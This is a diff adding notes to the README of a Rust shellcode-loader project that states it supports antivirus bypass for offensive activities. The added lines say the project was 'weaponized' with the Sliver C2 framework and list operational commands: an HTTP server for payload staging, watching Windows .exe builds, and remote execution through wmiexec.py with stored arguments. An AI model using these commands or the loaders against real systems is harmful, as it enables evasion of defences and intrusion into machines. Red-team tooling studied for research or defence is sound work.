@@ -1,3 +1,16 @@
+edit by Brother-x86:
+I just weaponized with Sliver the awesome work done in this repo:
+- https://github.com/b1nhack/rust-shellcode
+
+usefull commands (for me):
+```
+sudo python3 -m http.server 80
+cd /rust-shellcode/target/x86_64-pc-windows-gnu/release/ ;  watch -n1 "ls *exe -lah
+wmiexec.py $(cat ~/.exec)
+```
+
+This is the original Readme:
+
 # 🤖 rust-shellcode 🤖
 This project provides the underlying support for bypass av of offensive activities.  
 The available Shellcode loaders include:
